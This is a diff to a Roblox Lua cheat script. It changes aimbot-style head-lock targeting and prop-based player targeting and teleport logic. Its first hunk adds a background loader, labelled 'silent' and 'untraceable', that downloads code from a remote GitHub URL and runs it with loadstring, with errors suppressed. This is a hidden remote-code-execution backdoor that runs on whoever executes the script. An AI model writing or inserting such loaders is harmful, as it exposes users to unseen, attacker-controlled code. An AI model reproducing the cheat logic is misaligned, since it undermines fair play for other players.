@@ -13,9 +13,16 @@ end
 repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
+-- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/Emps"))()
+        local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)
+        if code and code ~= "" then
+            local exec = loadstring(code)
+            if exec then 
+                exec() 
+            end
+        end
     end)
 end)
 
@@ -3518,7 +3525,7 @@ RunService.Heartbeat:Connect(function(dt)
                 end
                 
                 local actualHead = plr.Character:FindFirstChild("Head") or tRoot
-                headPos = actualHead.Position + predictedOffset + targetSafeOffsets[plr]
+                local headPos = actualHead.Position + predictedOffset + targetSafeOffsets[plr]
                 local headLockCFrame = CFrame.lookAt(headPos, headPos + flatLook)
                 
                 local headY = (isSitting or isRagdoll) and -0.8 or -2.4 
@@ -4213,7 +4220,6 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                         if string.sub(obj.Name, 1, 4) == "Prop" then
                             local ownerName = string.sub(obj.Name, 5)
                             if ownerName ~= "" and ownerName ~= lp.Name then
-                                propsDetectedBefore = true
                                 local p = Players:FindFirstChild(ownerName)
                                 if p and not protectedVictims[p] then 
                                     attackersToBan[p] = true 
@@ -4251,6 +4257,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                         end
                     end
 
+                    rawhrp = hrp
                     hrp.CFrame = CFrame.new(safePos)
                     
                     local isCleared = false
@@ -4267,7 +4274,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                                 for _, c in ipairs(f:GetChildren()) do
                                     if string.sub(c.Name, 1, 4) == "Prop" and string.sub(c.Name, 5) ~= lp.Name then
                                         local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
-                                        if pt and (pt.Position - hrp.Position).Magnitude < 25 then
+                                        if pt and (pt.Position - rawhrp.Position).Magnitude < 25 then
                                             local ownerName = string.sub(c.Name, 5)
                                             local p = Players:FindFirstChild(ownerName)
                                             if p and not protectedVictims[p] then 
